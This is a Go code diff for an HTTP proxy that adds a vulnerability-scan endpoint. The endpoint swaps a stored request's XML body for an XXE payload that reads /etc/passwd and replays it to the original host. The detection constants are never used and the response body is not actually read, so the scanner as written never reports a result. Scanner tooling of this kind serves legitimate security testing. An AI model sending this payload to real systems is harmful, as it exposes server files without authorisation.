@@ -1,6 +1,7 @@
 package delivery
 
 import (
+	"bytes"
 	"encoding/json"
 	"io/ioutil"
 	"net/http"
@@ -12,6 +13,13 @@ import (
 	"github.com/sirupsen/logrus"
 
 	"httpproxy/internal/proxy/repositiory"
+)
+
+const (
+	xxe                 = "<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n"
+	xml                 = "<?xml"
+	target              = "root:"
+	requestIsVulnerable = "request is vulnerable!!!"
 )
 
 type Api struct {
@@ -33,6 +41,7 @@ func NewApi(rep *repositiory.DB, proxy *Proxy) *Api {
 	router.HandleFunc("/repeat/{request_id:[0-9]+}", api.RepeatRequest)
 	router.HandleFunc("/requests/{request_id:[0-9]+}", api.GetRequest)
 	router.HandleFunc("/requests", api.GetAllRequests)
+	router.HandleFunc("/scan/{request_id:[0-9]+}", api.VulnerabilityScan)
 
 	return api
 }
@@ -119,4 +128,62 @@ func (api *Api) GetAllRequests(w http.ResponseWriter, r *http.Request) {
 		w.Write(bytes)
 		w.Write([]byte("\n\n"))
 	}
+}
+
+func (api *Api) VulnerabilityScan(w http.ResponseWriter, r *http.Request) {
+	requestID, err := strconv.Atoi(mux.Vars(r)["request_id"])
+	if err != nil {
+		logrus.Error(err)
+		w.WriteHeader(http.StatusNotFound)
+		return
+	}
+
+	request, err := api.rep.GetRequest(requestID)
+	if err != nil {
+		logrus.Error(err)
+		w.WriteHeader(http.StatusNotFound)
+		return
+	}
+
+	if ind := strings.Index(request.Body, xml); ind != -1 {
+		request.Body = request.Body[:ind] + xxe
+	}
+	body := bytes.NewBufferString(request.Body)
+
+	if request.Scheme == "" {
+		request.Scheme = "https"
+	}
+	urlStr := request.Scheme + "://" + request.Host + request.Path
+	req, err := http.NewRequest(request.Method, urlStr, body)
+	if err != nil {
+		logrus.Error(err)
+		w.WriteHeader(http.StatusBadRequest)
+		return
+	}
+
+	for key, value := range request.Headers {
+		req.Header.Add(key, strings.Join(value, " "))
+	}
+
+	response, err := http.DefaultTransport.RoundTrip(req)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusServiceUnavailable)
+		return
+	}
+	defer response.Body.Close()
+
+	if err != nil {
+		logrus.Error(err)
+		w.WriteHeader(http.StatusBadRequest)
+		return
+	}
+
+	bytes, err := json.Marshal(response.Body)
+	if err != nil {
+		logrus.Error(err)
+		w.WriteHeader(http.StatusBadRequest)
+		return
+	}
+
+	w.Write(bytes)
 }
